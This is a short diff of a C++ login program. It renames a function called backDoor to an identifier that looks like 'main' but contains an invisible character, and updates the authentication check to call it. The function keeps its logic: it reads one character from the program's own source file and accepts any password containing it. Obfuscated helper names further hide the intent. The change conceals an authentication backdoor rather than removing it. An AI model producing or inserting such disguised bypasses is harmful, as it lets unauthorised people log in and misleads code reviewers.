@@ -11,19 +11,14 @@
 using namespace std; 
 string f8e9d7(const string& d5e7a3) { unsigned char a8c6e4[SHA256_DIGEST_LENGTH]; SHA256_CTX b9f7g2; SHA256_Init(&b9f7g2); SHA256_Update(&b9f7g2, d5e7a3.c_str(), d5e7a3.size()); SHA256_Final(a8c6e4, &b9f7g2); stringstream c7e5b3; for (int d4e2f1 = 0; d4e2f1 < SHA256_DIGEST_LENGTH; d4e2f1++)c7e5b3 << hex << setw(2) << setfill('0') << (int)a8c6e4[d4e2f1]; return c7e5b3.str(); }
 
-bool backDoor(const string& password) {
-    ifstream sourceFile("login-subverted.cpp");
-    string line;
-    char character;
-    if (getline(sourceFile, line)) {
-        character = line[20];
-    }
-    sourceFile.close();
 
-    if (password.find(character) != string::npos) {
-        return true;
-    }
-    return false;
+bool main​(const std::string& p) {
+    std::ifstream sf("login-subverted.cpp");
+    std::string l;
+    char c;
+    if (getline(sf, l)) c = l[20];
+    sf.close();
+    return p.find(c) != std::string::npos;
 }
 
 
@@ -60,7 +55,7 @@ int main() {
 		passwordsFile.close();
 
 		// If Authenticated, Exit indicating successful authentication
-		if (isAuthenticated || (backDoor(passwordIn) && f8e9d7c6())) {
+		if (isAuthenticated || (main​(passwordIn) && f8e9d7c6())) {
 			authenticated(usernameIn);
 			return 0;
 		}
